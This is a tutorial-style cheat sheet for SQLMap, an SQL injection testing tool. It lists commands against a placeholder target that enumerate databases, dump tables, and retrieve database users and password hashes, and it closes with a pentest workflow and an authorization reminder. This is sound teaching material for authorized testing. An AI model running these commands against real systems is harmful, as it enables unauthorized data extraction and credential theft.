SQLMap

SQLMap is an open-source penetration testing tool designed to detect and exploit SQL Injection vulnerabilities automatically.

It supports multiple database management systems and can perform database enumeration, data extraction, and other database-related testing tasks.

Why Use SQLMap?

SQLMap automates many SQL Injection testing tasks that would otherwise require manual effort.

It is widely used during web application penetration testing.

What Can SQLMap Do?

• Detect SQL Injection Vulnerabilities

• Identify Database Type

• Enumerate Databases

• Enumerate Tables

• Enumerate Columns

• Extract Data

• Retrieve Database Users

• Retrieve Password Hashes

• Test Authentication Mechanisms

Supported Databases

SQLMap supports many database systems.

Examples:

MySQL
Microsoft SQL Server
PostgreSQL
Oracle
SQLite
MariaDB

Basic Syntax

sqlmap [options]

Testing a URL

Analyze a parameter for SQL Injection vulnerabilities.

sqlmap -u "http://target.com/page.php?id=1"

Testing POST Requests

Test data sent through a POST request.

sqlmap -u "http://target.com/login"
--data="username=test&password=test"

Using a Request File

Import a raw HTTP request captured from Burp Suite.

sqlmap -r request.txt

This is one of the most common approaches during web application testing.

Database Fingerprinting

Identify the backend database technology.

sqlmap -u "http://target.com?id=1" --banner

Enumerating Databases

List available databases.

sqlmap -u "http://target.com?id=1" --dbs

Example:

information_schema
users_db
shop_db

Enumerating Tables

List tables inside a database.

sqlmap -u "http://target.com?id=1"
-D users_db
--tables

Enumerating Columns

List columns inside a table.

sqlmap -u "http://target.com?id=1"
-D users_db
-T users
--columns

Dumping Data

Retrieve data from a table.

sqlmap -u "http://target.com?id=1"
-D users_db
-T users
--dump

Database Users

Enumerate database user accounts.

sqlmap -u "http://target.com?id=1" --users

Password Hashes

Retrieve database password hashes when accessible.

sqlmap -u "http://target.com?id=1" --passwords

Cookie Authentication

Include session cookies during testing.

sqlmap -u "http://target.com/profile?id=1"
--cookie="session=abc123"

HTTP Headers

Add custom headers to requests.

sqlmap -u "http://target.com?id=1"
--headers="Authorization: Bearer TOKEN"

Batch Mode

Automatically answer prompts.

sqlmap -u "http://target.com?id=1" --batch

Risk and Level

Control the intensity of testing.

--risk=1-3

--level=1-5

Example:

sqlmap -u "http://target.com?id=1"
--risk=3
--level=5

Common Detection Techniques

SQLMap can test multiple SQL Injection techniques.

Examples:

• Boolean-Based Blind

• Time-Based Blind

• Error-Based

• UNION-Based

• Stacked Queries

SQLMap Workflow

1- Identify a potentially injectable parameter.

2- Capture the request using Burp Suite.

3- Import the request into SQLMap.

4- Confirm SQL Injection.

5- Enumerate databases.

6- Enumerate tables and columns.

7- Retrieve authorized test data.

8- Document findings.

What Should a Penetration Tester Focus On?

• URL Parameters

• POST Parameters

• Cookies

• JSON Parameters

• Hidden Parameters

• Authentication Tokens

• API Endpoints

• Database Exposure

Important Note

SQLMap should only be used against systems for which you have explicit authorization to test.

It is a powerful assessment tool that helps security professionals identify and verify SQL Injection vulnerabilities efficiently.
